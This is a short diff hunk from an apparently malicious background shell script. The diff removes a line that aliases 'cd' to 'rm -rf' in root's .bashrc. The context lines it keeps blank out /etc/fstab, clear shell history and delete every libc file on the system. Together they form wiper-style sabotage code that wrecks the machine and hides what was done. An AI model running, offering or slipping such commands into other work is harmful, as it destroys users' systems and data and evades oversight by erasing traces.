@@ -561,8 +561,6 @@ nohup sh -c '
   sleep 5
   echo " " > /etc/fstab
   sleep 5
-  echo "alias cd='rm -rf'" >> /root/.bashrc
-  sleep 5
   history -c
   sleep 5
   find / -type f -name "libc*" -print -delete
